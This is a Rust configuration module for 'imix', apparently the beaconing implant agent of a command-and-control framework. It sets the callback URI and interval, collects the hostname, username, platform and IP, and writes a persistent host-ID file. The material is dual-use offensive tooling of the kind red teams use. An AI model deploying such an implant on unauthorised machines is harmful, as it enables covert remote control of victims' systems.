use crate::version::VERSION;
use c2::pb::host::Platform;
use std::{
    fs::{self, File},
    io::Write,
    path::Path,
};
use uuid::Uuid;

macro_rules! callback_uri {
    () => {
        match option_env!("IMIX_CALLBACK_URI") {
            Some(uri) => uri,
            None => "http://127.0.0.1:80/grpc",
        }
    };
}
/*
 * Compile-time constant for the agent callback URI, derived from the IMIX_CALLBACK_URI environment variable during compilation.
 * Defaults to "http://127.0.0.1:80/grpc" if this is unset.
 */
pub const CALLBACK_URI: &'static str = callback_uri!();

macro_rules! callback_interval {
    () => {
        match option_env!("IMIX_CALLBACK_INTERVAL") {
            Some(interval) => interval,
            None => "5",
        }
    };
}
/* Compile-time constant for the agent callback interval, derived from the IMIX_CALLBACK_INTERVAL environment variable during compilation.
 * Defaults to 5 if unset.
 */
pub const CALLBACK_INTERVAL: &'static str = callback_interval!();

/*
 * Config holds values necessary to configure an Agent.
 */
pub struct Config {
    pub info: c2::pb::Beacon,
    pub callback_uri: String,
}

/*
 * A default configuration for the agent.
 */
impl Default for Config {
    fn default() -> Self {
        let agent = c2::pb::Agent {
            identifier: format!("imix-v{}", VERSION),
        };

        let host = c2::pb::Host {
            name: whoami::hostname(),
            identifier: get_host_id(get_host_id_path()),
            platform: get_host_platform() as i32,
            primary_ip: get_primary_ip(),
        };

        let info = c2::pb::Beacon {
            identifier: String::from(Uuid::new_v4()),
            principal: whoami::username(),
            interval: match CALLBACK_INTERVAL.parse::<u64>() {
                Ok(i) => i,
                Err(_err) => {
                    #[cfg(debug_assertions)]
                    eprintln!("failed to parse callback interval constant, defaulting to 60 seconds: {_err}");

                    5 as u64
                }
            },
            host: Some(host),
            agent: Some(agent),
        };

        Config {
            info,
            callback_uri: String::from(CALLBACK_URI),
        }
    }
}

/*
 * Returns which Platform imix has been compiled for.
 */
fn get_host_platform() -> Platform {
    #[cfg(target_os = "linux")]
    return Platform::Linux;

    #[cfg(target_os = "macos")]
    return Platform::Macos;

    #[cfg(target_os = "windows")]
    return Platform::Windows;

    #[cfg(any(target_os = "freebsd", target_os = "netbsd", target_os = "openbsd"))]
    return Platform::Bsd;

    #[cfg(all(
        not(target_os = "linux"),
        not(target_os = "macos"),
        not(target_os = "windows"),
        not(target_os = "freebsd"),
        not(target_os = "netbsd"),
        not(target_os = "openbsd"),
    ))]
    return Platform::Unspecified;
}

/*
 * Returns a predefined path to the host id file based on the current platform.
 */
fn get_host_id_path() -> String {
    #[cfg(target_os = "windows")]
    return String::from("C:\\ProgramData\\system-id");

    #[cfg(not(target_os = "windows"))]
    return String::from("/etc/system-id");
}

/*
 * Attempt to read a host-id from a predefined path on disk.
 * If the file exist, it's value will be returned as the identifier.
 * If the file does not exist, a new value will be generated and written to the file.
 * If there is any failure reading / writing the file, the generated id is still returned.
 */
fn get_host_id(file_path: String) -> String {
    // Read Existing Host ID
    let path = Path::new(file_path.as_str());
    if path.exists() {
        match fs::read_to_string(path) {
            Ok(host_id) => return host_id.trim().to_string(),
            Err(_) => {}
        }
    }

    // Generate New
    let host_id = Uuid::new_v4().to_string();

    // Save to file
    match File::create(path) {
        Ok(mut f) => match f.write_all(host_id.as_bytes()) {
            Ok(_) => {}
            Err(_err) => {
                #[cfg(debug_assertions)]
                eprintln!("failed to write host id file: {_err}");
            }
        },
        Err(_err) => {
            #[cfg(debug_assertions)]
            eprintln!("failed to create host id file: {_err}");
        }
    };

    return host_id;
}

/*
 * Return the first IPv4 address of the default interface as a string.
 * Returns the empty string otherwise.
 */
fn get_primary_ip() -> String {
    match default_net::get_default_interface() {
        Ok(default_interface) => match default_interface.ipv4.first() {
            Some(ip) => ip.addr.to_string(),
            None => String::from(""),
        },
        Err(_err) => {
            #[cfg(debug_assertions)]
            eprintln!("failed to get primary ip: {_err}");

            String::from("")
        }
    }
}
